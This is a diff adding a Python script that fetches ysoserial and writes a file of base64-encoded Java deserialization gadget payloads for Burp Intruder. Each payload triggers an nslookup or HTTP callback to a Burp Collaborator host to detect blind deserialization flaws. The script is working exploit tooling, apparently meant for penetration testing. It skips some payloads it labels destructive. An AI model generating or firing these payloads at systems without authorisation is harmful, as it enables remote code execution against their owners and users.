@@ -1,0 +1,113 @@
+#!/usr/bin/env python
+
+import requests
+import sys
+import os
+import shutil
+import argparse
+import subprocess
+import base64
+import logging
+
+UPDATE_URL = "https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar"
+YSOSERIAL = ""
+PAYLOAD_TABLE = {
+    "C3P0": lambda collaborator: f"http://C3P0.{collaborator}/:test.class",
+    "Myfaces2": lambda collaborator: f"http://Myfaces2.{collaborator}/:test.class",
+    "URLDNS": lambda collaborator: f"http://URLDNS.{collaborator}/",
+}
+AVOID_PAYLOAD = {
+    "FileUpload1": "Could delete sensitive data or break things",
+    "JRMPListener": "Opens listener in port, cant't be tested automatically in intruder",
+    "Jython1": "Need manual testing goto https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jython1.java",
+    "Wicket1": "Could delete sensitive data or break things",
+}
+
+
+def die(error):
+    logging.error("FATAL: %s", error)
+    sys.exit(-1)
+
+
+def get_ysoserial_path():
+    resp = requests.get(UPDATE_URL, allow_redirects=False)
+    if resp.status_code != 302:
+        die("expecting redirection when checking for updates on ysoserial jitpack.io")
+
+    upstream_filename = resp.headers['Location'].split("/")[-1]
+
+    ysoserial = os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib", upstream_filename)
+
+    need_download = True
+    try:
+        # Check if upstream version exist
+        os.stat(ysoserial)
+        need_download = False
+    except:
+        pass
+
+    if need_download:
+        # Version does not match, remove any present version of ysoserial.
+        ysoserial_path = os.path.dirname(ysoserial)
+        shutil.rmtree(ysoserial_path)
+        os.mkdir(ysoserial_path)
+
+        # Download last version
+        with open(ysoserial, 'wb') as fh:
+            r = requests.get(UPDATE_URL, allow_redirects=True)
+            fh.write(r.content)
+
+    return ysoserial
+
+
+def ysoserial_pyloads():
+    cmd = subprocess.Popen("java -jar {}".format(YSOSERIAL), shell=True, stderr=subprocess.PIPE)
+    skip_header = True
+    for line in cmd.stderr:
+        line = line.decode()
+        if not skip_header:
+            yield line.split()[0]
+        elif "----" in line:
+            skip_header = False
+
+
+def generate_pyload(type, inner_command):
+    command = f"java -jar {YSOSERIAL} {type} \"{inner_command}\""
+
+    logging.info("RUNNING: %s", command)
+    cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
+
+    return base64.b64encode(cmd.stdout.read())
+
+
+if __name__ == '__main__':
+    YSOSERIAL = get_ysoserial_path()
+
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-c", "--collaborator", help="Burp Collaborator hostname", required=True)
+    parser.add_argument("-o", "--out", help="Output file for intruder", required=True)
+    parser.add_argument("-d", "--debug", help="Set debug info", action="store_true")
+
+    ops = parser.parse_args()
+
+    if ops.debug:
+        logging.basicConfig(level=logging.DEBUG)
+
+    ops.collaborator = ops.collaborator.strip(".")
+
+    count = 0
+    with open(ops.out, 'wb') as fout:
+        for type in ysoserial_pyloads():
+            if type in AVOID_PAYLOAD:
+                logging.warning("Avoiding the use of %s payload: %s", type, AVOID_PAYLOAD[type])
+                continue
+
+            inner_command = f"nslookup {type}.{ops.collaborator}"
+            if type in PAYLOAD_TABLE:
+                inner_command = PAYLOAD_TABLE[type](ops.collaborator)
+
+            fout.write(generate_pyload(type, inner_command))
+            fout.write(b"\r\n")
+            count += 1
+
+    logging.info("TOTAL Payloads: %d", count)
